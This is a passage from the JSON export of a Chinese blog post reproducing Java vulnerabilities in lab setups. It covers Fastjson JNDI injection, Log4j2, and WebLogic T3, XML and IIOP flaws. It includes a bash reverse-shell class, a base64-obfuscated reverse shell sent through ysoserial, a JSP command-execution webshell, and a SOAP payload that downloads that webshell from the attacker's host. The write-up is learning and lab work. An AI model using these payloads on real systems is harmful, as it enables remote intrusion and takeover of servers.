number\">9999</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304200115390.png\" alt=\"image-20230420011506338\"></p>\n<p>而后抓包，修改为POST请求，修改<strong>Content-Type为 application/json</strong>，而后传输如下数据</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"b\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"com.sun.rowset.JdbcRowSetImpl\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"dataSourceName\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"rmi://192.168.1.129:9999/TouchFile\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"autoCommit\"</span><span class=\"token operator\">:</span><span class=\"token boolean\">true</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304200116176.png\" alt=\"image-20230420011605096\"></p>\n<p>而后查看容器中的/tmp下已成功生成<strong>success</strong>，反弹shell同理，只需要更改代码即可</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// javac TouchFile.java</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Runtime</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Process</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TouchFile</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">static</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token class-name\">Runtime</span> rt <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> commands <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"/bin/bash\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"bash -i >&amp; /dev/tcp/192.168.1.129/6666 0>&amp;1\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">Process</span> pc <span class=\"token operator\">=</span> rt<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>commands<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            pc<span class=\"token punctuation\">.</span><span class=\"token function\">waitFor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// do nothing</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h1 id=\"Log4j2\"><a href=\"#Log4j2\" class=\"headerlink\" title=\"Log4j2\"></a>Log4j2</h1><h2 id=\"漏洞原理-4\"><a href=\"#漏洞原理-4\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>log4j2框架下的<strong>lookup查询服务</strong>提供了**{}<strong>字段解析功能，传进去的值会被直接解析。例如</strong>${java:version}**会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）。</p>\n<p>攻击者可以利用这一点进行<strong>JNDI注入</strong>，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的**.class对象**，造成了远程代码执行（可反弹shell到指定服务器）。</p>\n<h1 id=\"Weblogic\"><a href=\"#Weblogic\" class=\"headerlink\" title=\"Weblogic\"></a>Weblogic</h1><h2 id=\"T3反序列化漏洞\"><a href=\"#T3反序列化漏洞\" class=\"headerlink\" title=\"T3反序列化漏洞\"></a>T3反序列化漏洞</h2><p><strong>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以</strong></p>\n<p><strong>通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击。</strong></p>\n<h3 id=\"漏洞复现-3\"><a href=\"#漏洞复现-3\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h3><p>准备反弹shell指令如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">bash <span class=\"token operator\">-</span>c <span class=\"token punctuation\">&#123;</span>echo<span class=\"token punctuation\">,</span><span class=\"token class-name\">YmFzaCAtaSA</span><span class=\"token operator\">+</span><span class=\"token class-name\">JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ</span><span class=\"token operator\">==</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">&#123;</span>base64<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span>d<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">&#123;</span>bash<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//Base64编码的内容为bash -i >&amp; /dev/tcp/192.168.1.129/6666 0>&amp;1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>接下来开启监听</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201350396.png\" alt=\"image-20230420135029363\"></p>\n<p>接下来利用反序列化工具<strong>ysoserial.jar</strong></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">java <span class=\"token operator\">-</span>cp ysoserial<span class=\"token operator\">-</span>all<span class=\"token punctuation\">.</span>jar <span class=\"token class-name\"><span class=\"token namespace\">ysoserial<span class=\"token punctuation\">.</span>exploit<span class=\"token punctuation\">.</span></span>JRMPListener</span> <span class=\"token number\">9999</span> <span class=\"token class-name\">CommonsCollections1</span> 'bash <span class=\"token operator\">-</span>c <span class=\"token punctuation\">&#123;</span>echo<span class=\"token punctuation\">,</span><span class=\"token class-name\">YmFzaCAtaSA</span><span class=\"token operator\">+</span><span class=\"token class-name\">JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ</span><span class=\"token operator\">==</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">&#123;</span>base64<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span>d<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">&#123;</span>bash<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">&#125;</span>'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201417339.png\" alt=\"image-20230420141739301\"></p>\n<p>接下来下载Exp进行攻击，</p>\n<p><strong>Exp地址：<a href=\"https://www.exploit-db.com/exploits/44553\">https://www.exploit-db.com/exploits/44553</a></strong></p>\n<p>复制代码到<strong>Exploit.py</strong>中，接下来执行如下指令</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">python2 <span class=\"token class-name\">Exploit</span><span class=\"token punctuation\">.</span>py <span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.129</span> <span class=\"token number\">7001</span> <span class=\"token operator\">/</span>tools<span class=\"token operator\">/</span>weblogic<span class=\"token operator\">/</span>ysoserial<span class=\"token operator\">-</span>all<span class=\"token punctuation\">.</span>jar <span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.129</span> <span class=\"token number\">9999</span> <span class=\"token class-name\">JRMPClient</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201421865.png\" alt=\"image-20230420142121751\"></p>\n<p>此时查看监听处</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201421374.png\" alt=\"image-20230420142144309\"></p>\n<p>成功反弹shell</p>\n<h2 id=\"XML漏洞\"><a href=\"#XML漏洞\" class=\"headerlink\" title=\"XML漏洞\"></a>XML漏洞</h2><h4 id=\"漏洞复现-4\"><a href=\"#漏洞复现-4\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h4><p>Vulhub复现</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">cd vulhub<span class=\"token operator\">/</span>weblogic<span class=\"token operator\">/</span>CVE<span class=\"token operator\">-</span><span class=\"token number\">2017</span><span class=\"token operator\">-</span><span class=\"token number\">10271</span>\ndocker<span class=\"token operator\">-</span>compose up  <span class=\"token operator\">-</span>d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>开启环境后访问<strong><a href=\"http://192.168.1.129:7001/_async/AsyncResponseService\">http://192.168.1.129:7001/_async/AsyncResponseService</a></strong></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201346928.png\"></p>\n<p>访问成功说明存在漏洞</p>\n<p>写入<strong>shell.txt</strong>文件，内容如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"123\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pwd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>InputStream</span> in <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token number\">1024</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;pre>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">=</span>in<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;/pre>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token operator\">%</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来开启http服务，使得它可以被访问</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python <span class=\"token operator\">-</span>m SimpleHTTPServer <span class=\"token number\">1387</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201219337.png\" alt=\"image-20230420121959310\"></p>\n<p>在浏览器访问</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201220743.png\" alt=\"image-20230420122017707\"></p>\n<p>接下来就可以直接打了，更改<strong>Content-Type为:text/xml</strong>，而后传输POST数据如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>soapenv<span class=\"token operator\">:</span><span class=\"token class-name\">Envelope</span> \nxmlns<span class=\"token operator\">:</span>soapenv<span class=\"token operator\">=</span><span class=\"token string\">\"http://schemas.xmlsoap.org/soap/envelope/\"</span> xmlns<span class=\"token operator\">:</span>wsa<span class=\"token operator\">=</span><span class=\"token string\">\"http://www.w3.org/2005/08/addressing\"</span> xmlns<span class=\"token operator\">:</span>asy<span class=\"token operator\">=</span><span class=\"token string\">\"http://www.bea.com/async/AsyncResponseService\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>soapenv<span class=\"token operator\">:</span><span class=\"token class-name\">Header</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>wsa<span class=\"token operator\">:</span><span class=\"token class-name\">Action</span><span class=\"token operator\">></span>xx<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>wsa<span class=\"token operator\">:</span><span class=\"token class-name\">Action</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>wsa<span class=\"token operator\">:</span><span class=\"token class-name\">RelatesTo</span><span class=\"token operator\">></span>xx<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>wsa<span class=\"token operator\">:</span><span class=\"token class-name\">RelatesTo</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>work<span class=\"token operator\">:</span><span class=\"token class-name\">WorkContext</span> xmlns<span class=\"token operator\">:</span>work<span class=\"token operator\">=</span><span class=\"token string\">\"http://bea.com/2004/06/soap/workarea/\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token keyword\">void</span> <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.lang.ProcessBuilder\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>array <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.lang.String\"</span> length<span class=\"token operator\">=</span><span class=\"token string\">\"3\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token keyword\">void</span> index<span class=\"token operator\">=</span><span class=\"token string\">\"0\"</span><span class=\"token operator\">></span>\n<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>string<span class=\"token punctuation\">></span></span><span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>bash<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>string<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token keyword\">void</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token keyword\">void</span> index<span class=\"token operator\">=</span><span class=\"token string\">\"1\"</span><span class=\"token operator\">></span>\n<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>string<span class=\"token punctuation\">></span></span><span class=\"token operator\">-</span>c<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>string<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token keyword\">void</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token keyword\">void</span> index<span class=\"token operator\">=</span><span class=\"token string\">\"2\"</span><span class=\"token operator\">></span>\n<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>string<span class=\"token punctuation\">></span></span>wget http<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span><span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.129</span><span class=\"token operator\">:</span><span class=\"token number\">1387</span><span class=\"token operator\">/</span>shell<span class=\"token punctuation\">.</span>txt <span class=\"token operator\">-</span><span class=\"token class-name\">O</span> servers<span class=\"token operator\">/</span><span class=\"token class-name\">AdminServer</span><span class=\"token operator\">/</span>tmp<span class=\"token operator\">/</span>_WL_internal<span class=\"token operator\">/</span>bea_wls9_async_response<span class=\"token operator\">/</span><span class=\"token number\">8</span>tpkys<span class=\"token operator\">/</span>war<span class=\"token operator\">/</span>shell<span class=\"token punctuation\">.</span>jsp<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>string<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token keyword\">void</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>array<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token keyword\">void</span> method<span class=\"token operator\">=</span><span class=\"token string\">\"start\"</span><span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token keyword\">void</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>work<span class=\"token operator\">:</span><span class=\"token class-name\">WorkContext</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>soapenv<span class=\"token operator\">:</span><span class=\"token class-name\">Header</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>soapenv<span class=\"token operator\">:</span><span class=\"token class-name\">Body</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>asy<span class=\"token operator\">:</span>onAsyncDelivery<span class=\"token operator\">/</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>soapenv<span class=\"token operator\">:</span><span class=\"token class-name\">Body</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>soapenv<span class=\"token operator\">:</span><span class=\"token class-name\">Envelope</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201218848.png\" alt=\"image-20230420121756747\"></p>\n<p>状态202则说明成功写入，接下来去访问这个木马文件并尝试执行命令</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201218512.png\" alt=\"image-20230420121831475\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201218753.png\" alt=\"image-20230420121850723\"></p>\n<p>成功实现命令执行</p>\n<h2 id=\"iiop反序列化漏洞\"><a href=\"#iiop反序列化漏洞\" class=\"headerlink\" title=\"iiop反序列化漏洞\"></a>iiop反序列化漏洞</h2><p><strong>漏洞主要原因是错误的过滤JtaTransactionManager类，JtaTransactionManager父类AbstractPlatformTransactionManager在之前的补丁里面就加入到黑名单列表了,T3协议使用的是resolveClass方法去过滤的,resolveClass方法是会读取父类的,所以T3协议这样过滤是没问题的。但是IIOP协议这块,虽然也是使用的这个黑名单列表,但不是使用resolveClass方法去判断的,这样默认只会判断本类的类名,而JtaTransactionManager类是不在黑名单列表里面的,它的父类才在黑名单列表里面,这样就可以反序列化JtaTransactionManager类了,而JtaTransactionManager类是存在jndi注入的。</strong></p>\n<h2 id=\"SSRF漏洞\"><a href=\"#SSRF漏洞\" class=\"headerlink\" title=\"SSRF漏洞\"></a>SSRF漏洞</h2><p><strong>weblogic中存在SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件</strong></p>\n<h1 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h1><p>中间出了一点小Bug，就是我没安装javac，只有java，但安装了过后发现无法运行jar包了</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201416763.png\" alt=\"image-20230420141640717\"></p>\n<p>百度过后发现是jdk版本的问题，我们可以使用下面指令来切换JDK版本</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">update<span class=\"token operator\">-</span>alternatives <span class=\"token operator\">--</span>config java <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201417059.png\" alt=\"image-20230420141703012\"></p>\n<p>更改为低版本后成功运行jar包</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304201417724.png\" alt=\"image-20230420141722679\"></p>\n","feature":true,"text":"ShiroShiro 550漏洞原理Shiro550漏洞原理是Shiro框架提供了一种记住密码(Rememberme)的功能，用户登录成功后会生成经过加密的Cookie值，对Remembe的Cookie进行AES解密、Base64解密后再反序列化，就导致了反序列化RCE漏洞 。 ...","link":"","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":1,"path":"api/tags/漏洞复现.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Shiro\"><span class=\"toc-text\">Shiro</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Shiro-550\"><span class=\"toc-text\">Shiro 550</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">漏洞原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">漏洞复现</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">脚本</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">自动化工具</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Shiro-721\"><span class=\"toc-text\">Shiro 721</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1\"><span class=\"toc-text\">漏洞原理</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Struts2\"><span class=\"toc-text\">Struts2</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2\"><span class=\"toc-text\">漏洞原理</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">漏洞检测</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1\"><span class=\"toc-text\">漏洞复现</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#s2-001\"><span class=\"toc-text\">s2-001</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#s2-053\"><span class=\"toc-text\">s2-053</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#S2-061\"><span class=\"toc-text\">S2-061</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Fastjson\"><span class=\"toc-text\">Fastjson</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3\"><span class=\"toc-text\">漏洞原理</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2\"><span class=\"toc-text\">漏洞复现</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Log4j2\"><span class=\"toc-text\">Log4j2</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4\"><span class=\"toc-text\">漏洞原理</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Weblogic\"><span class=\"toc-text\">Weblogic</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">T3反序列化漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3\"><span class=\"toc-text\">漏洞复现</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XML%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">XML漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4\"><span class=\"toc-text\">漏洞复现</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">iiop反序列化漏洞</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSRF%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">SSRF漏洞</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%85%B6%E4%BB%96\"><span class=\"toc-text\">其他</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"一洞百分-记一次意外通杀之旅","uid":"594145ca1c62f813346e24debc2a5552","slug":"记一次渗透测试","date":"2023-04-30T18:27:30.000Z","updated":"2023-09-03T12:49:58.000Z","comments":true,"path":"api/articles/记一次渗透测试.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305010231396.jpeg","text":"声明文章首发于奇安信社区https://forum.butian.net/share/2264 